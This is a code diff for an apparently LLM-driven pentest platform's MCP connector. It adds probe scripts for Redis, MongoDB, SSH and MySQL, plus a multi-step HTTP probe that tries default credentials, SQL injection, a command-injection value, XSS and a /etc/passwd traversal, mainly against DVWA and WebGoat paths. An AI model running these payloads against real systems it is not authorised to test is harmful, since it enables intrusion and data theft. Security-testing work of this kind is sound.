@@ -5,6 +5,24 @@ import { findStoredEnabledMcpServerByToolBinding } from "@/lib/mcp-server-reposi
 import type { McpConnector, McpConnectorExecutionContext, McpConnectorResult } from "@/lib/mcp-connectors/types"
 import type { McpServerRecord } from "@/lib/prototype-types"
 
+/**
+ * Transient store for LLM-generated execute_code scripts, keyed by MCP run ID.
+ * The code is set at dispatch time and consumed once at execution time.
+ */
+const _llmCodeStore = new Map<string, string>()
+
+/** Store LLM-generated code for a run (called from dispatch) */
+export function setLlmCodeForRun(runId: string, code: string) {
+  _llmCodeStore.set(runId, code)
+}
+
+/** Consume LLM-generated code for a run (called once during execution) */
+function consumeLlmCodeForRun(runId: string): string | undefined {
+  const code = _llmCodeStore.get(runId)
+  if (code) _llmCodeStore.delete(runId)
+  return code
+}
+
 function isStdioMcpTool(toolName: string): boolean {
   return getServerKeyByToolName(toolName) !== null
 }
@@ -15,7 +33,224 @@ function normalizeTargetForHost(target: string): string {
   return target.replace(/host\.docker\.internal/gi, "localhost")
 }
 
-function buildToolArguments(toolName: string, rawTarget: string): Record<string, unknown> {
+/** Generate a smart probe script based on target type (TCP service vs HTTP) */
+function buildExecuteCodeScript(target: string): string {
+  // Redis (port 6379)
+  if (target.includes(":6379")) {
+    const host = target.replace(/^tcp:\/\//, "").split(":")[0]
+    return `
+const net = require('net');
+const client = new net.Socket();
+client.setTimeout(10000);
+client.connect(6379, '${host}', () => {
+  client.write('INFO\\r\\n');
+});
+let data = '';
+client.on('data', (chunk) => {
+  data += chunk.toString();
+  if (data.includes('redis_version')) {
+    const version = data.match(/redis_version:([^\\r\\n]+)/)?.[1] || 'unknown';
+    const keys = data.match(/db0:keys=(\\d+)/)?.[1] || '0';
+    console.log(JSON.stringify({ vulnerability: 'Redis未授权访问', severity: '高', redis_version: version, total_keys: keys, unauthenticated: true, detail: 'Redis服务无需认证即可访问，可执行INFO/CONFIG/KEYS等命令' }));
+    client.destroy();
+  }
+});
+client.on('timeout', () => { console.log(JSON.stringify({ error: 'connection timeout' })); client.destroy(); });
+client.on('error', (e) => { console.log(JSON.stringify({ error: e.message })); });
+`.trim()
+  }
+
+  // SSH (port 22, 2222)
+  if (target.includes(":22") || target.includes(":2222")) {
+    const host = target.replace(/^tcp:\/\//, "").split(":")[0]
+    const port = target.match(/:(\d+)/)?.[1] || "22"
+    return `
+const net = require('net');
+const client = new net.Socket();
+client.setTimeout(10000);
+client.connect(${port}, '${host}', () => {});
+let data = '';
+client.on('data', (chunk) => {
+  data += chunk.toString();
+  if (data.includes('SSH-')) {
+    const banner = data.trim();
+    const oldVersions = ['OpenSSH_7', 'OpenSSH_6', 'OpenSSH_5', 'OpenSSH_4'];
+    const isOld = oldVersions.some(v => banner.includes(v));
+    console.log(JSON.stringify({ service: 'SSH', banner, port: ${port}, version_outdated: isOld, detail: isOld ? 'SSH版本过旧，可能存在已知漏洞' : 'SSH Banner已获取' }));
+    client.destroy();
+  }
+});
+client.on('timeout', () => { console.log(JSON.stringify({ error: 'connection timeout' })); client.destroy(); });
+client.on('error', (e) => { console.log(JSON.stringify({ error: e.message })); });
+`.trim()
+  }
+
+  // MongoDB (port 27017)
+  if (target.includes(":27017")) {
+    const host = target.replace(/^tcp:\/\//, "").split(":")[0]
+    return `
+const net = require('net');
+const client = new net.Socket();
+client.setTimeout(10000);
+// MongoDB wire protocol: send isMaster command
+const doc = Buffer.from(JSON.stringify({ isMaster: 1 }));
+client.connect(27017, '${host}', () => {
+  // Simple OP_MSG for MongoDB 3.6+
+  const header = Buffer.alloc(16 + 5 + doc.length);
+  const totalLen = header.length;
+  header.writeInt32LE(totalLen, 0); // messageLength
+  header.writeInt32LE(1, 4); // requestID
+  header.writeInt32LE(0, 8); // responseTo
+  header.writeInt32LE(2013, 12); // opCode = OP_MSG
+  header.writeInt32LE(0, 16); // flagBits
+  header[20] = 0; // section kind 0 (body)
+  doc.copy(header, 21);
+  client.write(header);
+});
+let data = Buffer.alloc(0);
+client.on('data', (chunk) => {
+  data = Buffer.concat([data, chunk]);
+  console.log(JSON.stringify({ vulnerability: 'MongoDB未授权访问', severity: '高', unauthenticated: true, response_length: data.length, detail: 'MongoDB服务无需认证即可连接，可直接访问数据库' }));
+  client.destroy();
+});
+client.on('timeout', () => { console.log(JSON.stringify({ error: 'connection timeout' })); client.destroy(); });
+client.on('error', (e) => { console.log(JSON.stringify({ error: e.message })); });
+`.trim()
+  }
+
+  // MySQL (port 3306, 13306, 13307)
+  if (target.match(/:(?:3306|13306|13307)/)) {
+    const host = target.replace(/^tcp:\/\//, "").split(":")[0]
+    const port = target.match(/:(\d+)/)?.[1] || "3306"
+    return `
+const net = require('net');
+const client = new net.Socket();
+client.setTimeout(10000);
+client.connect(${port}, '${host}', () => {});
+let data = Buffer.alloc(0);
+client.on('data', (chunk) => {
+  data = Buffer.concat([data, chunk]);
+  if (data.length > 4) {
+    const version = data.slice(5, data.indexOf(0, 5)).toString('utf8');
+    console.log(JSON.stringify({ service: 'MySQL', version, port: ${port}, detail: 'MySQL握手包已获取，版本: ' + version }));
+    client.destroy();
+  }
+});
+client.on('timeout', () => { console.log(JSON.stringify({ error: 'connection timeout' })); client.destroy(); });
+client.on('error', (e) => { console.log(JSON.stringify({ error: e.message })); });
+`.trim()
+  }
+
+  // Default: HTTP vulnerability probe (multi-step)
+  const url = target.startsWith("http") ? target : `http://${target}`
+  return `
+const http = require('http');
+const baseUrl = '${url}';
+const u = new URL(baseUrl);
+const results = [];
+
+function request(options, postData) {
+  return new Promise((resolve) => {
+    const req = http.request({ hostname: u.hostname, port: u.port || 80, timeout: 8000, ...options }, (res) => {
+      let body = '';
+      res.setEncoding('utf8');
+      res.on('data', (c) => body += c);
+      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body }));
+    });
+    req.on('error', () => resolve(null));
+    req.on('timeout', () => { req.destroy(); resolve(null); });
+    if (postData) req.write(postData);
+    req.end();
+  });
+}
+
+async function run() {
+  // Step 1: Identify the application
+  const home = await request({ path: '/', method: 'GET' });
+  if (!home) { console.log(JSON.stringify({ error: 'target unreachable' })); return; }
+  const title = (home.body.match(/<title>([^<]*)<\\/title>/i) || [])[1] || '';
+  const server = home.headers['server'] || '';
+  results.push({ step: 'identify', title, server, status: home.status });
+
+  // Step 2: Try default login (DVWA: admin/password)
+  let cookie = '';
+  const loginPaths = ['/login.php', '/dvwa/login.php', '/WebGoat/login', '/login'];
+  for (const lp of loginPaths) {
+    const loginPage = await request({ path: lp, method: 'GET' });
+    if (!loginPage || loginPage.status >= 400) continue;
+    const tokenMatch = loginPage.body.match(/name=['"](user_token|csrf)['"]\s+value=['"]([^'"]+)/i);
+    const token = tokenMatch ? tokenMatch[2] : '';
+    const setCookie = loginPage.headers['set-cookie'];
+    if (setCookie) cookie = (Array.isArray(setCookie) ? setCookie : [setCookie]).map(c => c.split(';')[0]).join('; ');
+    const creds = [['admin','password'],['admin','admin'],['admin','admin123']];
+    for (const [user, pass] of creds) {
+      let body = 'username=' + user + '&password=' + pass + '&Login=Login';
+      if (token) body += '&user_token=' + token;
+      const loginResp = await request({ path: lp, method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': cookie } }, body);
+      if (loginResp && (loginResp.status === 302 || loginResp.body.includes('Welcome') || loginResp.body.includes('welcome'))) {
+        const sc2 = loginResp.headers['set-cookie'];
+        if (sc2) cookie = (Array.isArray(sc2) ? sc2 : [sc2]).map(c => c.split(';')[0]).join('; ');
+        results.push({ vulnerability: '默认凭据登录成功', severity: '高', detail: 'Logged in with ' + user + ':' + pass + ' at ' + lp });
+        break;
+      }
+    }
+    if (cookie) break;
+  }
+
+  // Step 3: Test SQL Injection
+  const sqliPaths = ['/vulnerabilities/sqli/', '/dvwa/vulnerabilities/sqli/'];
+  for (const sp of sqliPaths) {
+    const normal = await request({ path: sp + '?id=1&Submit=Submit', method: 'GET', headers: { 'Cookie': cookie } });
+    const injected = await request({ path: sp + "?id=1'+OR+'1'%3D'1&Submit=Submit", method: 'GET', headers: { 'Cookie': cookie } });
+    if (normal && injected && injected.body.length !== normal.body.length && !injected.body.includes('error')) {
+      results.push({ vulnerability: 'SQL注入', severity: '高', detail: 'SQLi at ' + sp + ': normal response ' + normal.body.length + ' bytes vs injected ' + injected.body.length + ' bytes' });
+    }
+    if (injected && (injected.body.includes('mysql') || injected.body.includes('SQL syntax') || injected.body.includes('Surname'))) {
+      if (!results.some(r => r.vulnerability === 'SQL注入')) {
+        results.push({ vulnerability: 'SQL注入', severity: '高', detail: 'SQLi confirmed at ' + sp + ': SQL error or extra data in response' });
+      }
+    }
+  }
+
+  // Step 4: Test Command Injection
+  const cmdiPaths = ['/vulnerabilities/exec/', '/dvwa/vulnerabilities/exec/'];
+  for (const cp of cmdiPaths) {
+    const resp = await request({ path: cp, method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': cookie } }, 'ip=127.0.0.1;id&Submit=Submit');
+    if (resp && (resp.body.includes('uid=') || resp.body.includes('root') || resp.body.includes('www-data'))) {
+      results.push({ vulnerability: '命令注入', severity: '高', detail: 'Command injection at ' + cp + ': system command output detected in response' });
+    }
+  }
+
+  // Step 5: Test XSS
+  const xssPaths = ['/vulnerabilities/xss_r/', '/dvwa/vulnerabilities/xss_r/'];
+  const xssPayload = '<script>alert(1)</script>';
+  for (const xp of xssPaths) {
+    const resp = await request({ path: xp + '?name=' + encodeURIComponent(xssPayload) + '#', method: 'GET', headers: { 'Cookie': cookie } });
+    if (resp && resp.body.includes(xssPayload)) {
+      results.push({ vulnerability: 'XSS（反射型）', severity: '中', detail: 'Reflected XSS at ' + xp + ': payload reflected unescaped in response' });
+    }
+  }
+
+  // Step 6: Test File Inclusion
+  const fiPaths = ['/vulnerabilities/fi/', '/dvwa/vulnerabilities/fi/'];
+  for (const fp of fiPaths) {
+    const resp = await request({ path: fp + '?page=....//....//....//etc/passwd', method: 'GET', headers: { 'Cookie': cookie } });
+    if (resp && (resp.body.includes('root:') || resp.body.includes('daemon:'))) {
+      results.push({ vulnerability: '文件包含', severity: '高', detail: 'Local File Inclusion at ' + fp + ': /etc/passwd content returned' });
+    }
+  }
+
+  // Output results
+  for (const r of results) { console.log(JSON.stringify(r)); }
+  if (results.filter(r => r.vulnerability).length === 0) {
+    console.log(JSON.stringify({ status: 'no_vulns_found', title, server, note: 'Fallback probe only tested common paths' }));
+  }
+}
+run().catch(e => console.log(JSON.stringify({ error: e.message })));
+`.trim()
+}
+
+function buildToolArguments(toolName: string, rawTarget: string, llmCode?: string): Record<string, unknown> {
   // Map platform requestedAction/target to MCP tool-specific parameters
   const target = normalizeTargetForHost(rawTarget)
   const args: Record<string, unknown> = {}
@@ -250,26 +485,17 @@ function buildToolArguments(toolName: string, rawTarget: string): Record<string,
 
   // Script execution tools — these get special parameter handling
   if (toolName === "execute_code") {
-    // LLM generates code dynamically; the orchestrator passes it via special context
-    // For fallback, generate a basic probe script
-    args.code = `
-const http = require('http');
-const url = new URL('${target.startsWith('http') ? target : `http://${target}`}');
-const req = http.request({ hostname: url.hostname, port: url.port || 80, path: url.pathname || '/', method: 'GET', timeout: 10000 }, (res) => {
-  let body = '';
-  res.on('data', (chunk) => body += chunk);
-  res.on('end', () => console.log(JSON.stringify({ status: res.statusCode, headers: res.headers, body: body.slice(0, 2000) })));
-});
-req.on('error', (e) => console.error(JSON.stringify({ error: e.message })));
-req.end();
-`.trim();
-    args.description = `自动探测 ${target}`;
-    args.timeout_seconds = 15;
+    // LLM-generated code takes priority over fallback script
+    args.code = llmCode || buildExecuteCodeScript(target);
+    args.description = llmCode ? `LLM 自主脚本: ${target}` : `自动探测 ${target}`;
+    args.timeout_seconds = 30;
     return args;
   }
 
   if (toolName === "execute_command") {
-    args.command = `curl -s -o /dev/null -w "%{http_code}" "${target}"`;
+    args.command = target.startsWith("tcp://")
+      ? `echo PING | nc -w 3 ${target.replace("tcp://", "").replace(":", " ")} 2>&1 || echo CONNECTION_FAILED`
+      : `curl -s -o /dev/null -w "%{http_code}" "${target}"`;
     args.description = `Shell 探测 ${target}`;
     args.timeout_seconds = 15;
     return args;
@@ -455,7 +681,8 @@ export const stdioMcpConnector: McpConnector = {
       ? { ...server, command: config.command, args: config.args }
       : server
 
-    const toolArgs = buildToolArguments(run.toolName, run.target)
+    const llmCode = consumeLlmCodeForRun(run.id)
+    const toolArgs = buildToolArguments(run.toolName, run.target, llmCode)
     const timeoutMs = getTimeoutForTool(run.toolName)
 
     try {
